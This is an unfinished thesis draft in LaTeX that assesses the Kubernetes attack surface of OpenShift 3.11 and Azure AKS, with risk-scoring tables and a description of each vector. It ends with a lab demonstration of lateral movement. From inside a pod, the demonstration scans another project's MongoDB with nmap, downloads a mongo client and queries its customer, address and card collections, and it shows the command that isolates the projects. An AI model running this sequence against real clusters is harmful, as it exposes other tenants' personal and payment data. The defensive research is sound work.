Focus on three scenarios: attack through network, hijacked container, bad user

Research-Freeze: May 3rd, 2019! (Pre-KubeCon19, check git commit dates for stuff like OWASP-documents etc!)
Some newer information might be used for big outliers, but everything else just gets a side note

RISK ASSESSMENT METHODOLOGY:
difficulties with: 
A how generically should vectors be set?
B how to structure vectors (into categories?) 

Solution to A: vectors split and merged after risk assessment sketch; if there were considerable differences in the estimated values, they were split. If no diffs, they were merged.
Solution to B: Considerable time invested, no optimal solution was found. Ultimately ignored this, since more time investment wasnt feasible or added much value to the goals. TODO: Explain process, what was looked at and why it wasnt good, how we arrived at the end structure.

Risk assessment formula:
Risk = Probability * Impact.
Impact was taken as single value of 1 through 3  and estimated through None/Theoretical (0), Low/Intermediate-Step (1), non-severe security principle violation (2), severe security principle violation (3)

Probability was a bitch to define proberly. Therefore split into four factors: Vantage Point, Required Access Level (RAL), Detectability and Exploitability. Those initially had values between 0 though 3, but outlier values of 4  were defined for RAL and Vantage Point (in sync with existing assessment methodologies within HvS).
The average of these four values is taken as the total propability value, ranging from 0.25 through 3.5 (low <= 1.25, medium <= 2.25).
Vantage Point: physical access (0, see above since your own or the cloud providers hardware-accessing employees can also do whatever they want); node or management-interface (1); within container (2); within company network (3); from public www (4)
Required Access Level: cloud/infrastructure admin (0, since a rogue employee with super-admin can do whatever they want and this is about baseline security); cluster/system-admin (1); cluster/system user with read/write access (2); cluster/system user with read-only access (3); unauthenticated (4)
Detectability: Difficult (1) since it needs custom tools for environment-specific vuln detction; Average (2) since it is either generic but needs simple custom tools or its individualized but can be identified with some slight tool individualization; Easy (3) since there are generic script-kiddie tools / GUI-paths to find the vuln
Exploitability: Theoretical (0, since this is the level of unpublished 0-days and we are still doing baseline security); difficult (1) needs custom tools for environment-specific exploitation; Average(2), since its a generic exploit but needs simple custom tools or its inividualized but can be exploited with some slight tool individualization; Easy (3) since there are generic script-kiddie tools / GUI-paths to exploit the vuln

This leads to a total risk of 0 through 10.5, which is then rounded to full integers and capped at 10. In accordance to HvS internal models, total risk values <= 3 are defined as low, <= 6 as medium and values above that are defined as high.

specific values for each vector are estimated in a context with multiple assumptions:
TODO: callback to assumptions in scope limitation

- If multiple techniques can be used / impacts can occur to leverage a vector, all factor values of the one with the highest total risk are taken
- Values might decrease through the implementation of security measures, leading to a lower total value. (If multiple techniques could be used to leverage a vector and only one gets its total risk reduced, the new maximum risk value of that vector becomes the vector value(s)

goal is to reduce values above threshold X to below threshold X by applying security measures. This aims to ensure a basic security level, not something against APT groups / zero-day protection / targeted attacks with a lot of resources and competence. (no online banking, user data of average confidentiality etc)

Default values are defined as the following:

SETUP OF PRACTICAL PART:

Version freeze:
\gls{ocp} 3.11 -> OKD 3.11 ->  k8s-version = 1.11(.0 with fixes, is a fork. see: https://github.com/openshift/origin/releases/tag/v3.11.0 )
AKS (on May 3rd 2019) => k8s-version <= v1.13.5 available, but only for k8s-v1.11 only 1.11.8 or 1.11.9!

Considerable changes between 1.11.0 and 1.11.9 (Source: https://github.com/kubernetes/kubernetes/blob/master/CHANGELOG-1.11.md):
- action required: the API server and client-go libraries have been fixed to support additional non-alpha-numeric characters in UserInfo "extra" data keys. Both should be updated in order to properly support extra data containing "/" characters or other characters disallowed in HTTP headers. (\#65799, @dekkagaijin)
- https://github.com/kubernetes/autoscaler/releases/tag/cluster-autoscaler-1.3.1
- ACTION REQUIRED: Removes defaulting of CSI file system type to ext4. All the production drivers listed under https://kubernetes-csi.github.io/docs/Drivers.html were inspected and should not be impacted after this change. If you are using a driver not in that list, please test the drivers on an updated test cluster first. ``` (\#65499, @krunaljain)
- kube-apiserver: the Priority admission plugin is now enabled by default when using --enable-admission-plugins. If using --admission-control to fully specify the set of admission plugins, the Priority admission plugin should be added if using the PodPriority feature, which is enabled by default in 1.11. (\#65739, @liggitt)
The system-node-critical and system-cluster-critical priority classes are now limited to the kube-system namespace by the PodPriority admission plugin. (\#65593, @bsalamat)

no major changes => OCP 3.11, AKS-k8s 1.11.9!

Dependency compatibilities:
OCP 3.11: docker 1.13, CRI-O 1.11 (Source: LINK COMMENTED %https://docs.openshift.com/container-platform/3.11/release_notes/ocp_3_11_release_notes.html#ocp-311-about-this-release)
k8s-1.11: docker 1.11.2 to 1.13.1  (Source: LINK COMMENTED % https://github.com/kubernetes/kubernetes/blob/master/CHANGELOG-1.11.md#external-dependencies), CRI-O 1.11 (in-synch to k8s releases, source: https://github.com/cri-o/cri-o)
Azure-AKS: uses moby, NOT docker! (moby = pluggable container runtime based on docker, automatically updated in background whenever no node restart needed)

-> take defaults for all dependencies on install, document and apply all AKS node updates needing manual restart!
TODO: apply OCP updates when incoming?

%TODO: END OLD STUFF, REVISIT%

\section{Estimating the risk} \label{riskEstimate}
%TODO put full tables into appendix + only reference here.
%TODO get cell background colour working in latex tables

The resulting risk estimation is illustrated in Table \ref{tab:estimateComparison}. The individual values these results are derived from can be seen in tables \ref{tab:ocpRiskTable} and \ref{tab:aksRiskTable}. The details on how these values were determined are explained hereafter.

\begin{table}[H]
\centering
\resizebox{\textwidth}{!}{%
\begin{tabular}{|c|l|c|c|}
\hline
{\ul Vector ID} & \multicolumn{1}{c|}{{\ul Vector}}                                                      & {\ul OCP Risk} & {\ul AKS Risk} \\ \hline
V01             & Reconaissance through Kubernetes \& platform control plane interfaces                  & \textbf{3}     & \textbf{3}     \\ \hline
V02             & Read confidentials through Kubernetes \& platform control plane interfaces             & \textbf{6}     & \textbf{7}     \\ \hline
V03             & Change configuration through Kubernetes \& platform control plane interfaces           & \textbf{7}     & \textbf{8}     \\ \hline
V04             & Compromise internal k8s control plane components (etcd, scheduler, controller-manager) & \textbf{5}     & \textbf{6}     \\ \hline
V05             & Supply compromised container (base) image                                              & \textbf{7}     & \textbf{7}     \\ \hline
V06             & Supply compromised k8s configuration                                                   & \textbf{10}    & \textbf{10}    \\ \hline
V07             & Compromise other application components (lateral movement)                             & \textbf{7}     & \textbf{7}     \\ \hline
V08             & Container breakout (R/W, Privilege Escalation)                                         & \textbf{5}     & \textbf{7}     \\ \hline
V09             & Compromise local image cache                                                           & \textbf{3}     & \textbf{3}     \\ \hline
V10             & Modify running container                                                               & \textbf{5}     & \textbf{5}     \\ \hline
V11             & Hoard resources (sabotage)                                                             & \textbf{8}     & \textbf{5}     \\ \hline
V12             & Misuse resources (cryptojacking)                                                       & \textbf{5}     & \textbf{8}     \\ \hline
V13             & Add malicious container                                                                & \textbf{5}     & \textbf{6}     \\ \hline
V14             & Add malicious node                                                                     & \textbf{6}     & \textbf{6}     \\ \hline
V15             & Bad user practice (outside of cluster)                                                 & \textbf{6}     & \textbf{6}     \\ \hline
V16             & Incufficient base infrastructure hardening                                             & \textbf{9}     & \textbf{9}     \\ \hline
V17             & Entry through known, unpatched vulnerabilities                                         & \textbf{10}    & \textbf{10}    \\ \hline
\end{tabular}%
}
\caption{A comparison of the resulting risk for the OCP and AKS environment}
\label{tab:estimateComparison}
\end{table}


\begin{landscape}
\begin{table}[]
\caption{The risk estimation of all vectors for an OCP 3.11 cluster}
\label{tab:ocpRiskTable}
\resizebox{\textwidth}{!}{%
\begin{tabular}{|c|l|cccc|cc|c|}
\hline
{\ul Vector ID} & \multicolumn{1}{c|}{{\ul Vector}}                                                      & \multicolumn{1}{c|}{{\ul Vantage Point}} & \multicolumn{1}{c|}{{\ul RAL}} & \multicolumn{1}{c|}{{\ul Detectability}} & {\ul Exploitability} & \multicolumn{1}{c|}{{\ul Probability}} & {\ul Impact} & {\ul Resulting risk} \\ \hline
V01             & Reconaissance through Kubernetes \& platform control plane interfaces                  & 3                                        & 3                              & 3                                        & 2                    & 2.75                                   & 1            & \textbf{3}           \\ \hline
V02             & Read confidentials through Kubernetes \& platform control plane interfaces             & 3                                        & 3                              & 3                                        & 3                    & 3                                      & 2            & \textbf{6}           \\ \hline
V03             & Change configuration through Kubernetes \& platform control plane interfaces           & 3                                        & 1                              & 3                                        & 2                    & 2.25                                   & 3            & \textbf{7}           \\ \hline
V04             & Compromise internal k8s control plane components (etcd, scheduler, controller-manager) & 3                                        & 1                              & 3                                        & 0                    & 1.75                                   & 3            & \textbf{5}           \\ \hline
V05             & Supply compromised container (base) image                                              & 4                                        & 4                              & 3                                        & 2                    & 3.25                                   & 2            & \textbf{7}           \\ \hline
V06             & Supply compromised k8s configuration                                                   & 4                                        & 4                              & 3                                        & 2                    & 3.25                                   & 3            & \textbf{10}          \\ \hline
V07             & Compromise other application components (lateral movement)                             & 2                                        & 2                              & 3                                        & 2                    & 2.25                                   & 3            & \textbf{7}           \\ \hline
V08             & Container breakout (R/W, Privilege Escalation)                                         & 2                                        & 2                              & 3                                        & 0                    & 1.75                                   & 3            & \textbf{5}           \\ \hline
V09             & Compromise local image cache                                                           & 1                                        & 1                              & 2                                        & 2                    & 1.5                                    & 2            & \textbf{3}           \\ \hline
V10             & Modify running container                                                               & 2                                        & 2                              & 3                                        & 2                    & 2.25                                   & 2            & \textbf{5}           \\ \hline
V11             & Hoard resources (sabotage)                                                             & 3                                        & 2                              & 3                                        & 2                    & 2.5                                    & 3            & \textbf{8}           \\ \hline
V12             & Misuse resources (cryptojacking)                                                       & 3                                        & 2                              & 3                                        & 2                    & 2.5                                    & 2            & \textbf{5}           \\ \hline
V13             & Add malicious container                                                                & 3                                        & 2                              & 3                                        & 2                    & 2.5                                    & 2            & \textbf{5}           \\ \hline
V14             & Add malicious node                                                                     & 3                                        & 1                              & 2                                        & 2                    & 2                                      & 3            & \textbf{6}           \\ \hline
V15             & Bad user practice (outside of cluster)                                                 & 3                                        & 4                              & 2                                        & 2                    & 2.75                                   & 2            & \textbf{6}           \\ \hline
V16             & Incufficient base infrastructure hardening                                             & 4                                        & 4                              & 2                                        & 2                    & 3                                      & 3            & \textbf{9}           \\ \hline
V17             & Entry through known, unpatched vulnerabilities                                         & 4                                        & 4                              & 3                                        & 2                    & 3.25                                   & 3            & \textbf{10}          \\ \hline
\end{tabular}%
}
\end{table}
\end{landscape}


\begin{landscape}
\begin{table}[]
\centering
\resizebox{\textwidth}{!}{%
\begin{tabular}{|c|l|cccc|cc|c|}
\hline
{\ul Vector ID} & \multicolumn{1}{c|}{{\ul Vector}}                                                      & \multicolumn{1}{c|}{{\ul Vantage Point}} & \multicolumn{1}{c|}{{\ul RAL}} & \multicolumn{1}{c|}{{\ul Detectability}} & {\ul Exploitability} & \multicolumn{1}{c|}{{\ul Probability}} & {\ul Impact} & {\ul Resulting risk} \\ \hline
V01             & Reconaissance through Kubernetes \& platform control plane interfaces                  & 4                                        & 3                              & 3                                        & 2                    & 3                                      & 1            & \textbf{3}           \\ \hline
V02             & Read confidentials through Kubernetes \& platform control plane interfaces             & 4                                        & 3                              & 3                                        & 3                    & 3.25                                   & 2            & \textbf{7}           \\ \hline
V03             & Change configuration through Kubernetes \& platform control plane interfaces           & 4                                        & 1                              & 3                                        & 2                    & 2.5                                    & 3            & \textbf{8}           \\ \hline
V04             & Compromise internal k8s control plane components (etcd, scheduler, controller-manager) & 4                                        & 1                              & 3                                        & 0                    & 2                                      & 3            & \textbf{6}           \\ \hline
V05             & Supply compromised container (base) image                                              & 4                                        & 4                              & 3                                        & 2                    & 3.25                                   & 2            & \textbf{7}           \\ \hline
V06             & Supply compromised k8s configuration                                                   & 4                                        & 4                              & 3                                        & 2                    & 3.25                                   & 3            & \textbf{10}          \\ \hline
V07             & Compromise other application components (lateral movement)                             & 2                                        & 2                              & 3                                        & 2                    & 2.25                                   & 3            & \textbf{7}           \\ \hline
V08             & Container breakout (R/W, Privilege Escalation)                                         & 2                                        & 2                              & 3                                        & 2                    & 2.25                                   & 3            & \textbf{7}           \\ \hline
V09             & Compromise local image cache                                                           & 1                                        & 1                              & 2                                        & 2                    & 1.5                                    & 2            & \textbf{3}           \\ \hline
V10             & Modify running container                                                               & 2                                        & 2                              & 3                                        & 2                    & 2.25                                   & 2            & \textbf{5}           \\ \hline
V11             & Hoard resources (sabotage)                                                             & 3                                        & 2                              & 3                                        & 2                    & 2.5                                    & 2            & \textbf{5}           \\ \hline
V12             & Misuse resources (cryptojacking)                                                       & 3                                        & 2                              & 3                                        & 2                    & 2.5                                    & 3            & \textbf{8}           \\ \hline
V13             & Add malicious container                                                                & 4                                        & 2                              & 3                                        & 2                    & 2.75                                   & 2            & \textbf{6}           \\ \hline
V14             & Add malicious node                                                                     & 4                                        & 1                              & 1                                        & 2                    & 2                                      & 3            & \textbf{6}           \\ \hline
V15             & Bad user practice (outside of cluster)                                                 & 4                                        & 4                              & 2                                        & 2                    & 3                                      & 2            & \textbf{6}           \\ \hline
V16             & Incufficient base infrastructure hardening                                             & 4                                        & 4                              & 2                                        & 2                    & 3                                      & 3            & \textbf{9}           \\ \hline
V17             & Entry through known, unpatched vulnerabilities                                         & 4                                        & 4                              & 3                                        & 2                    & 3.25                                   & 3            & \textbf{10}          \\ \hline
\end{tabular}%
}
\caption{The risk estimation of all vectors for an OCP 3.11 cluster}
\label{tab:aksRiskTable}
\end{table}
\end{landscape}

\subsection{V01 - Reconaissance through Kubernetes \& platform control plane interfaces}

%OCP
A user with access to the apiserver / webinterface(s) and read access can scout out information.
By default, each account (project admin or project user, but not cluster admin) can only see information about his own project, a cluster admin can see all namespaces.
This could show outdated software versions, running systems / containers / pods / user account privileges / misconfigurations and may support in planning and confirming effectiveness of further attacks.

The information gathering processes and interfaces are known and documented pretty well, but the information gathered has to be analyzed specific to the environment.
%AKS
Same as OCP, except accessible from anywhere (cloud, duh).
-> doesn’t change total risk value

\subsection{V02 - Read confidentials through Kubernetes \& platform control plane interfaces}
%OCP
In addition to V01, a user with access to the apiserver / webinterface(s) and read access can gather confidential secrets like certs, tokens or passwords which are intended to be used by automated systems and/or users to authenticate themselves to cluster components and gain privileged access like pull/push images, trigger actions in other applications / containers, …
These can be gathered and used for further access by an attacker.

Kube-hunter is a readily available tool and checks for this automatically.

%AKS
Same as OCP, except accessible from anywhere (cloud, duh).
-> increases total risk value slightly, pushing it just over the edge from medium to high

\subsection{V03 - Change configuration through Kubernetes \& platform control plane interfaces}
%OCP
In adition to both V01 and V02, a user with access to the apiserver / webinterface(s) and write access can change configurations on the cluster. By default, each account (project admin or project user, but not cluster admin) can only change the configuration of namespaces resources (i.e. access to project-specific resources like pods, services, routes, but not cluster-global resources like nodes, SCCs or interface/authorization configurations). 

The capabilities can be looked up through the API, what you can achieve with it has to be analyzed environment-specifically though.

%AKS
Same as OCP, except accessible from anywhere (cloud, duh).
-> increases total risk value slightly, both are still rated high in the end


\subsection{V04 - Compromise internal k8s control plane components (etcd, scheduler, controller-manager)}
%OCP
Misconfiguration of internal Kubernetes components (accessible by systems it is not assigned to be accessible by) could lead to a full cluster compromise. The cluster configuration and all secrets / authorization credentials are stored in the etcd instance(s). One would need to seriously fuck up the setup, since OCP configures everything through ansible and you would have to knowingly change some internal settings not intended to be changed in order to achieve this. Configurations are maintained by red hat, meaning config changes will be applied in updates and additionally sent out to notify relevant people subscribed to those alerts.

Kube-hunter checks for misconfiguration, but can’t find any (non-false-positive) openings with default settings. Would need zero-day / known vuln in Microsoft or red hat configs

%AKS
Same as OCP, except accessible from anywhere (cloud, duh).
The master components are updated, configured and maintained by Microsoft, only when a restart is required the cluster administrator has to trigger it manually.
-> increases total risk value slightly, both are still rated medium in the end

\subsection{V05 - Supply compromised container (base) image}
%OCP
This has two facettes: it can be untargeted (image spraying) and targeted (compromising a specific image known to be used by the target).

The untargeted version needs the least access, since it simply needs a (free) dockerhub account to upload malicious images that could or couldn’t fulfil the function they are advertised to do. This is done in the hopes of someone downloading that image for use in his own environment, thus starting attacker-supplied containers within their cluster.
This could allow an attacker remote access to a container in the cluster and/or exfiltrate information.
Even without injecting malware, an attacker could mislabel old software versions as newer ones so software with known vulnerabilities is deployed because it is though to be up to date.

The targeted version could be specialized uploads to docker hub (similar to broad phishing vs. spear phishing) or “poisoning” an internal container image repository.

Image builds run as root, which could further be exploited – but this would need a vulnerability in the OCP / Azure build process.

These methods are publically known and both the docker container runtime and docker hub actively try to mitigate this, but malicious images are only deleted when reported by enough users and the security settings within the container runtime are not set by default.
Base containers and malware / known vulnerable versions are readily available from public sources, but need some technical expertise to plug together.

%AKS
Exactly the same as OCP

\subsection{V06 - Supply compromised k8s configuration}
%OCP
Similar to V07, this can be done either untargeted by spraying to tutorials / help forums or targeted, similar to spear phising.
If a cluster administrator does not fully analyze or understand the configuration he gets from public sources, the cluster could be compromised fully, i.e. by implementing backdoors through malicious containers with special access and ability to be remotely accessed by the attacker.

Examples are readily available from public sources, but need some technical expertise to plug together.

%AKS
Exactly the same as OCP

\subsection{V07 - Compromise other application components (lateral movement)}
%OCP
Once an attacker sits within a container, he can scan the network for other containers, hosts, services, apis or similar interfaces to further his access. By default, all containers in all projects (except master \& infra components) are put in the same subnet, allowing everyone to communicate with anyone else.
This is especially troubling for securing an environment with multiple tenants – even if the DB is not publically accessible, unauthorized access can be leveraged by anyone in the cluster.

Scanning tools like nmap etc. to find components to talk to are readily available, but their results are cluster-specific (everyone runs something different). Therefore some technical expertise is needed to leverage the network access needed. 

%AKS
Same as OCP. 
The worst AKS-specific problem with this is the mitigation. This risk is not clearly documented in the setup section of the documentation. If one stumbles upon this information in further sections of the docs after setting up his cluster, he might postpone or deny changing the setting to isolate different projects by default. This is because a full cluster rebuild is needed to change this setting!

\subsection{V08 - Container breakout (R/W, Privilege Escalation)}
%OCP
A deployed container poses the risk of allowing access to the node it is running on, thus allowing an attacker to “break out” of the container and perform actions on the node.
This poses a considerable threat, since any container may run on any node by default, allowing an attacker full access to any containers running on the node he controls, which will – especially over time – have a great chance to include containers belonging to other projects.

The OCP default settings limit the possibility of this dramatically, the risk lies more in organizations relaxing the defaults in favour of easy usability. (A majority of container images straight from docker hub require UID 0, which is denied by the default SCC ‘restricted’ in OCP during admission. This results in crashlooping and non-functional containers, developers would need to customize any image themselves. The easiest way to stop those problems this is to permit the default service account within a project access to the ‘privileged’ SCC permissions. This would significantly increase the risk of a container breakout!)

This is probably the most-talked about attack vector regarding containers, but techniques are not obviously documented and breakout methods would have to be customized to the restrictions applied within a cluster.

%AKS
Difference to OCP: containers can be run with UID 0 and more relaxed settings in general by default. User-namespace remapping not in place by default, vastly increasing the risk of a container breakout!
This is more on the usability>security side of things. 
-> raises risk, jumping from medium to high.


\subsection{V09 - Compromise local image cache}
%OCP
If you can swap out the cached container image on a host, the swapped-in version will run the next time this node spins up this container.
This is a very sneaky way to inject a malicious container, but within the default settings, access to the host file system is required.

Not well known and not entirely trivial to do (sneakily).

%AKS
Same as OCP.

\subsection{V10 - Modify running container}
%OCP
Instead of deploying a container with malicious contents, an attacker can try to modify and use an already running container to its needs by loading additional tools/binaries, changing configurations or exfiltrating data. This could be done through an RCE vuln, ssh access or others, just like any compromised linux machine.

-> Common sense to do this, same technical level as any command line interaction with a linux system.

%AKS
Same as OCP.

\subsection{V11 - Hoard resources (sabotage)}
%OCP
With enough access or restrictions too lax, an attacker may be able to seriously halt the availability of all workloads processed by the cluster by misconfiguration, conducting DOS attacks or wiping nodes or cluster configurations. Since it is a complex system, finding the sabotaged component can take considerable know-how and time if done well, increasing the impact – especially in on-premise environments, where resources are limited.

Wiping is common sense, sabotaging the cluster in a complex and effective way may take deeper knowledge and be customized to the environment.

%AKS
Difference to OCP: you can easily spin up more resources in the cloud -> less impact
-> risk decreases by a considerable margin, high to medium

\subsection{V12 - Misuse resources (cryptojacking)}
%OCP
In contrast to V14, an attacker will try to be sneaky if done well.
The goal here is to (ab)use the computing resources not belonging to and payed for by him to achieve monetary gain though mining cryptocurrencies.

Cryptojacking is regularly cited as an up-and-coming attack, but to do it with a low risk of being detected needs some technical skill.

%AKS
Difference to OCP: an attacker can easily spin up more resources in the cloud -> more impact
-> risk increases by a considerable margin, medium to high

\subsection{V13 - Add malicious container}
%OCP
Instead of manipulating running containers, an attacker with user access and permissions to spin up containers may start their own ones. (BYOC – bring-your-own-container?)
This is still restricted by container admission restrictions on the user/project, but at least he can install all needed binaries beforehand and his shell doesn’t die whenever the underlying container might be stopped.

Doing this is common sense, as before some technical skill is required to prepare a malicious container

%AKS
Same as OCP, except accessible from anywhere (cloud, duh).
-> increases total risk value slightly, both are still rated medium in the end

\subsection{V14 - Add malicious node}
%OCP
An attacker could try to add a malicious node to the cluster and inspect or manipulate data in or exfiltrate data from containers scheduled on it. Since any container may run anywhere, there is a high chance of all containers eventually being run on a given node over time, exposing the whole cluster to an attacker. This could be sped up by manipulating the reports of remaining resources on the node towards the scheduler.
By design, cluster administrator access is needed to add a node within OCP.

This technique is not talked about that much, but still available in public resources and possible in all clusters. Docs are publically available to add nodes to a cluster, basic linux server administration skills are needed to follow them.

%AKS
Accessible from anywhere (cloud).
-> total risk value unchanged
In contrast to OCP, you can spin up additional nodes more easily in AKS if configured on creation, but to access/control/manipulate them you still need cluster administrator access.
A tutorial on getting ssh access is available, but that’s lengthy and not trivial.

\subsection{V15 - Bad user practice (outside of cluster)}
%OCP
This vector comprises user practices outside of the cluster that lead to risks within it. Examples include phishing, openly publishing keys/tokens to public code repositories, password reuse, scouting specific software or container images used, publishing logs with information valuable to an attacker and more.
Could be done targeted (i.e. specific OSINT) or untargeted through github crawlers, scanning account/password dumps, …
Whatever you get could be used to access the cluster with the permissions granted by service-/user-accounts or as a reconnaissance base for further attacks.

There are tools available to do this, using them effectively requires some technical skill.

%AKS
Same as OCP, except accessible from anywhere (cloud, duh).
-> doesn’t change total risk value

\subsection{V16 - Incufficient base infrastructure hardening}
%OCP
The underlying nodes could allow an attacker easy entry, even if the containers themselves are hardened. This includes Side-Channel attacks like Spectre \& Meltdown, open ports on the servers exposed by other stuff running on it, being available from the public www, …
Vector exists mostly to sink all “classic” infra security measures in it, since those are researched and available everywhere and very much not the focus of the thesis.

Among worst case: unauthenticated access to run commands which is hosted publically on the internet for anyone to access and indexed by shodan. Bye bye cluster.
(Too many scenarios to hypothesize here, I’ll just point the finger at conventional server \& infra hardening standards and guidelines)

-> Well known, still needs some technical skill to find vulns and exploit them

%AKS
Suprisingly, same as OCP (despite the azure promise of PaaS-we-manage-your-infra)!
That’s the case since security updates on nodes that require a reboot are not done automatically, but have to be triggered manually or configured to trigger automatically.
Remediation is far less work though.

\subsection{V17 - Entry through known, unpatched vulnerabilities}
%OCP
Sinkhole vector for patch management. Would be a measure against every preceding vector otherwise.
Worst case could be anything, thus maximum risk. (See kubernetes CVE with 9.8 / 10)

To check for this is common sense, some technical skill may be needed to find and exploit unpatched stuff.

%AKS
Same as OCP. Even infra still needs user interaction to be patched, see preceding vector.

\chapter{Managing the attack surface risk}

With this chapter, the \gls{owasp} Risk Rating Methodology\footcite{riskRating} is continued. As completing the risk management process would exceed the scope of this thesis, the full process will be described and the risk management steps will be demonstrated through two exemplary vectors.

\section{Defining procedures and approach}
%TODO: explain what to do if doing everything, will only implement two examples (maybe list all measures and post-measure risks in annex?)
Normally one should start with the vector currently having the highest overall risk. We chose two other vectors, since these were more representative of the environments within scope and concise enough to properly present the process. Securing the underlying physical servers or \gls{vm}s is not an optimal example representing the process of securing a solution based on orchestrated containers.

TODO would start with highest vector, check possible measures and implement when acceptable/applicable. reassess vector risk and either implement more XOR accept residual risk if still highest. otherwise put back into queue -> pick up now highest vector and check possible measures, ... -> repeat until risks are either all below target threshold or all above are accepted.

\section{Managing the risk of V07 - Lateral movement from container}
%TODO: write out all from ppt with commands, pictures
TODO this was done in both AKS and OCP, is possible with both default configs!

\subsection{Demonstrating the successful attack without security measures}

LATERAL MOVEMENT  OCP COMMANDS - SET STAGE
Display projects:
oc projects
Lookup service ip from server (look for user-db ip) :
oc get service -n sock-shop
Show container used + scc’s needed for it:
cat network-utils.yaml
oc adm policy scc-review -z default -f network-utils.yaml
Start container and enter it:
oc apply -f network-utils.yaml
oc rsh network-utils

LATERAL MOVEMENT OCP SET STAGE DUMP (see latex source file here)
\iffalse
\begin{lstlisting}
[root@openshiftmaster ~]# oc projects
You have access to the following projects and can switch between them with 'oc project <projectname>':

    default
    kube-public
    kube-system
    management-infra
    openshift
    openshift-infra
    openshift-logging
    openshift-node
    openshift-sdn
    openshift-web-console
    other-team-deployment
    sock-shop
  * testuser

Using project "testuser" on server "https://openshiftmaster.lgr.com:8443".
[root@openshiftmaster ~]# oc get service -n sock-shop
NAME           TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)        AGE
carts          ClusterIP   172.30.64.220    <none>        80/TCP         17d
carts-db       ClusterIP   172.30.43.90     <none>        27017/TCP      17d
catalogue      ClusterIP   172.30.233.128   <none>        80/TCP         17d
catalogue-db   ClusterIP   172.30.235.75    <none>        3306/TCP       23d
front-end      NodePort    172.30.56.57     <none>        80:30001/TCP   23d
orders         ClusterIP   172.30.157.45    <none>        80/TCP         17d
orders-db      ClusterIP   172.30.11.68     <none>        27017/TCP      17d
payment        ClusterIP   172.30.95.255    <none>        80/TCP         17d
queue-master   ClusterIP   172.30.150.132   <none>        80/TCP         23d
rabbitmq       ClusterIP   172.30.248.38    <none>        5672/TCP       17d
shipping       ClusterIP   172.30.151.180   <none>        80/TCP         17d
user           ClusterIP   172.30.124.104   <none>        80/TCP         17d
user-db        ClusterIP   172.30.2.17      <none>        27017/TCP      17d
[root@openshiftmaster ~]# cat network-utils.yaml
apiVersion: v1
kind: Pod
metadata:
  name: network-utils
spec:
  containers:
    - name: network-utils
      image: amouat/network-utils
      command: [ "sh", "-c"]
      args:
        - while true; do
            sleep 10;
          done;
restartPolicy: Never
[root@openshiftmaster ~]# oc adm policy scc-review -z default -f network-utils.yaml
RESOURCE            SERVICE ACCOUNT   ALLOWED BY
Pod/network-utils   default           anyuid
Pod/network-utils   default           hostmount-anyuid
Pod/network-utils   default           hostnetwork
[root@openshiftmaster ~]# oc apply -f network-utils.yaml
pod/network-utils created
[root@openshiftmaster ~]# oc rsh network-utils
# 
\end{lstlisting}
\fi

LATERAL MOVEMENT OCP COMMANDS
\iffalse
\begin{lstlisting}
Check availability from within container (in other project) <- TODO: not feasible with -Pn?!
nmap -p27017 --script mongodb-databases 172.30.2.17 -Pn
Download mongo binary, connect to db in container:
curl fastdl.mongodb.org/linux/mongodb-linux-x86_64-4.0.10.tgz --resolve fastdl.mongodb.org:80:52.222.167.194 -O
tar -xvf mongodb-linux-x86_64-4.0.10.tgz
./mongodb-linux-x86_64-4.0.10/bin/mongo 172.30.2.17
Search for interesting data:
show dbs
use users
show collections
db.customers.find()
db.addresses.find()
db.cards.find()
Mitigate (as ocp system:admin, needs openshift-ovs-multitenant SDN plugin!):
oc adm pod-network isolate-projects sock-shop
\end{lstlisting}
\fi

LATERAL MOVEMENT OCP TEXT DUMP
\iffalse
\begin{lstlisting}[
# nmap -p27017 --script mongodb-databases 172.30.2.17 -Pn

Starting Nmap 6.47 ( http://nmap.org ) at 2019-06-13 15:16 UTC
Nmap scan report for 172.30.2.17
Host is up (0.00051s latency).
PORT      STATE SERVICE
27017/tcp open  mongodb
| mongodb-databases:
|   totalSize = 229376
|   ok = 1
|   databases
|     2
|       name = users
|       empty = false
|       sizeOnDisk = 114688
|     0
|       name = admin
|       empty = false
|       sizeOnDisk = 49152
|     1
|       name = local
|       empty = false
|_      sizeOnDisk = 65536

Nmap done: 1 IP address (1 host up) scanned in 0.52 seconds
# curl fastdl.mongodb.org/linux/mongodb-linux-x86_64-4.0.10.tgz --resolve fastdl.mongodb.org:80:52.222.167.194 -O
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 81.0M  100 81.0M    0     0  1069k      0  0:01:17  0:01:17 --:--:-- 1614k
# tar -xvf mongodb-linux-x86_64-4.0.10.tgz
mongodb-linux-x86_64-4.0.10/THIRD-PARTY-NOTICES.gotools
mongodb-linux-x86_64-4.0.10/README
mongodb-linux-x86_64-4.0.10/THIRD-PARTY-NOTICES
mongodb-linux-x86_64-4.0.10/MPL-2
mongodb-linux-x86_64-4.0.10/LICENSE-Community.txt
mongodb-linux-x86_64-4.0.10/bin/mongodump
mongodb-linux-x86_64-4.0.10/bin/mongorestore
mongodb-linux-x86_64-4.0.10/bin/mongoexport
mongodb-linux-x86_64-4.0.10/bin/mongoimport
mongodb-linux-x86_64-4.0.10/bin/mongostat
mongodb-linux-x86_64-4.0.10/bin/mongotop
mongodb-linux-x86_64-4.0.10/bin/bsondump
mongodb-linux-x86_64-4.0.10/bin/mongofiles
mongodb-linux-x86_64-4.0.10/bin/mongoreplay
mongodb-linux-x86_64-4.0.10/bin/mongod
mongodb-linux-x86_64-4.0.10/bin/mongos
mongodb-linux-x86_64-4.0.10/bin/mongo
mongodb-linux-x86_64-4.0.10/bin/install_compass
# ./mongodb-linux-x86_64-4.0.10/bin/mongo 172.30.2.17
MongoDB shell version v4.0.10
connecting to: mongodb://172.30.2.17:27017/test?gssapiServiceName=mongodb
WARNING: No implicit session: Logical Sessions are only supported on server versions 3.6 and greater.
Implicit session: dummy session
MongoDB server version: 3.4.1
WARNING: shell and server versions do not match
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
        http://docs.mongodb.org/
Questions? Try the support group
        http://groups.google.com/group/mongodb-user
Server has startup warnings:
2019-06-12T08:05:30.285+0000 I CONTROL  [initandlisten]
2019-06-12T08:05:30.285+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
2019-06-12T08:05:30.285+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
2019-06-12T08:05:30.285+0000 I CONTROL  [initandlisten]
2019-06-12T08:05:30.286+0000 I CONTROL  [initandlisten]
2019-06-12T08:05:30.286+0000 I CONTROL  [initandlisten] ** WARNING: /sys/kernel/mm/transparent_hugepage/enabled is 'always'.
